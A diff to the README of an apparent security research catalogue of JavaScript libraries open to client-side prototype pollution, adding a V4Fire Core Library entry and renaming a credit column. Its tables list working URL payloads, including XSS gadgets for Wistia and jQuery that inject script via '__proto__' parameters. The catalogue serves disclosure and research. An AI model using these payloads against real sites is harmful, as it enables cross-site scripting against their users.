@@ -10,15 +10,16 @@ In this repository, I am trying to collect examples of libraries that are vulner
 
 ## Prototype Pollution
 
-| Name                                                    | Payload                                                                  | Refs                                        | Author                                           |
+| Name                                                    | Payload                                                                  | Refs                                        | Found by                                         |
 |---------------------------------------------------------|--------------------------------------------------------------------------|---------------------------------------------|--------------------------------------------------|
 | Wistia Embedded Video (**Fixed**)                       | `?__proto__[test]=test`<br>`?__proto__.test=test`                        | [[1]](https://hackerone.com/reports/986386) | [William Bowling](https://twitter.com/wcbowling) |
 | [jQuery query-object plugin](/pp/jquery-query-object.md)| `?__proto__[test]=test`<br>`#__proto__[test]=test`                       |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
 | [jQuery Sparkle](/pp/jquery-sparkle.md)                 | `?__proto__.test=test`                                                   |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
+| [V4Fire Core Library](/pp/v4fire-core.md)               | `?__proto__.test=test`<br>`?__proto__[test]=test`                        |                                             | [Sergey Bobrov](https://twitter.com/Black2Fan)   |
 
 ## Script Gadgets
 
-| Name                                                    | Payload                                                                  | Impact                    | Refs                                        | Author                                              |
+| Name                                                    | Payload                                                                  | Impact                    | Refs                                        | Found by                                            |
 |---------------------------------------------------------|--------------------------------------------------------------------------|---------------------------|---------------------------------------------|-----------------------------------------------------|
 | [Wistia Embedded Video](/gadgets/wistia-video.md)       | `?__proto__[innerHTML]=<img/src/onerror=alert(1)>`                       | XSS                       | [[1]](https://hackerone.com/reports/986386) | [William Bowling](https://twitter.com/wcbowling)    |
 | [jQuery >= 3.0.0](/gadgets/jquery.md)                   | `?__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script`          | XSS                       |                                             | [Michał Bentkowski](https://twitter.com/SecurityMB) |
